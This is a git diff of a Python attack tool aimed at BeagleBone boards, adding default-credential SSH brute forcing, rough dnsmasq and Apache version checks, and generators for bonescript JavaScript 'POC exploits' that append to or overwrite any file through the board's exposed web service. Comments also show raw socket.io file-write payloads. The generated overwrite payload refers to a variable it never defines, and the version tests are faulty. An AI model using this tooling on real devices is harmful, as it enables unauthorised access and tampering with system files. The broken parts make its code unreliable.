@@ -4,19 +4,79 @@ import argparse
 from sys import version_info, path
 from pwn import *
 from time import sleep
+from os import geteuid
 
 def check_ssh(ip,user,passwd):
 	try:
 		s =  ssh(host=ip,
 	       user=user,
 	       password=passwd,port=22)
-		return s.download_data("/home/luke/.bash_history") is not None
+		return s.download_data("/home/debian/.bash_history") is not None
 	except:
 		return False
 
+def append_file(file, append):
+	return """
+/**
+This is a POC implementation of an exploit for the BeagleBone using bonescript.
+This file implements an append function on any file in the system.
+*/
 
-def scan(ip):
+var b = require('bonescript');
+// file to be changed
+var file = '%s';
+// this is the data read
+let output = '';
+// this is the data to append
+let append = '%s'
 
+// this function reads file and outputs data in the output variable
+b.readTextFile(file, function (x){
+    output = x.data;
+    console.log('inside method output of x'+output);
+});
+
+// this function writes data to a file
+// this function is delayed so it does not write before read is completed
+setTimeout(function(){ 
+     console.log("output of x:  "+output);
+    b.writeTextFile(file, output+append, readStatus);
+}, 3000); 
+
+function readStatus(x) {
+    console.log(JSON.stringify(x));
+}
+""" % (file, append)
+
+
+
+def overwrite_file(file, write):
+	return """
+/**
+This is a POC implementation of an exploit for the BeagleBone using bonescript.
+This file implements an append function on any file in the system.
+*/
+
+var b = require('bonescript');
+// file to be changed
+var file = '%s';
+// this is the data to append
+let append = '%s'
+
+// this function writes data to a file
+// this function is delayed so it does not write before read is completed
+setTimeout(function(){ 
+     console.log("output of x:  "+output);
+    b.writeTextFile(file, output+append, readStatus);
+},0); 
+
+function readStatus(x) {
+    console.log(JSON.stringify(x));
+}
+""" % (file, write)
+
+
+def scan(ip,args):
 	# notify user that the scan is beginning
 	print("Scanning "+ip+"...")
 	nm = nmap.PortScanner()
@@ -39,8 +99,24 @@ def scan(ip):
 		if args.aggressive:
 			pwd_map = [("root",""),("root","temppwd"),("debian",""),("debian","temppwd")]
 			for i in pwd_map:
-				works = check_ssh(ip,i[0],i[1])
-				print("attempt: "+str(i)+" "+works)
+				works = "works" if check_ssh(ip,i[0],i[1]) else "did not work"
+				print("[SSH] attempt: "+str(i)+" "+works)
+				if works:
+					break
+	# Checking DNSmasq
+	if 53 in relevant_results:
+		print("Port 53: DNSMASQ is open")
+		if "version" in relevant_results[53]:
+			version = relevant_results[53]["version"].split(".")
+			maj_version = int(version[0])
+			min_version = int(version[1])
+			if maj_version <=2 and min_version <= 78:
+				print("[DNSMASQ] version is vulnerable")
+			else:
+				print("[DNSMASQ] version is not vulnerable")
+		else:
+			print("[DNSMASQ] no version information returned.")
+
 	# Checking HTTP Port 80
 	if 80 in relevant_results:
 		print("Port 80: http is open")
@@ -48,11 +124,16 @@ def scan(ip):
 		#lets check to see if its Bone101
 		result = wget("http://"+ip, timeout=20)
 		if "Bone101" in result:
-			print("Server running open Bone101.")
+			print("[HTTP] Server running open Bone101.")
 			if args.aggressive:
-				pass
+				# this is where the headless browser would have been
+				if ui.yesno('Do you want to generate a POC Exploit?'):
+					if ui.yesno('Do you want to preserve the original file?'):
+						print(append_file("[file_name]", "[text to append]"))
+					else:
+						print(overwrite_file("[file_name]", "[text to overwrite]"))
 		else:
-			print("Server not running Bone101.")
+			print("[HTTP] Server not running Bone101.")
 
 			
 	if 3000 in relevant_results:
@@ -67,7 +148,18 @@ def scan(ip):
 		#42["bonescript$readTextFile",{"filename":"/home/debian/out.txt","seq":12}]
 		#42["bonescript$writeTextFile",{"filename":"/home/debian/out.txt","data":"heartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\nheartbeat\ndatatoappend\n","seq":13}]
 	if 8080 in relevant_results:
-		print("apache httpd running on port 8080")
+		print("Port 8080: HTTPD running on port 8080")
+		if "version" in relevant_results[8080]:
+			version = relevant_results[8080]["version"].split(".")
+			maj_version = int(version[0])
+			mid_version = int(version[1])
+			min_version = int(version[2])
+			if maj_version <=2 and mid_version <= 4 and min_version <= 25:
+				print("[HTTPD] version is vulnerable")
+			else:
+				print("[HTTPD] version is not vulnerable")
+		else:
+			print("[DNSMASQ] no version information returned.")
 
 def main():
 	# parse arguments
@@ -76,6 +168,13 @@ def main():
 	parser.add_argument("-aggr","-aggressive", '--aggressive', action="store_true")
 	parser.add_argument("-mean","-mean","--mean",action="store_true")
 	args = parser.parse_args()
+
+	if (args.aggressive or args.mean):
+		if not geteuid()==0:
+			print("you must run this as root if you wish to use agressive or mean options".upper())
+			return
+		print("Please only use these options on devices you have permission to use on.")
+
 
 	if "*" in args.ip:
 		ip = ".".join(args.ip.split(".")[:3])+"."
@@ -86,8 +185,9 @@ def main():
 			scan(ip+str(i))
 
 	else:
-		scan(args.ip)
+		scan(args.ip,args)
 
 
 if __name__ == "__main__":
 	main()
+	# print(check_root())
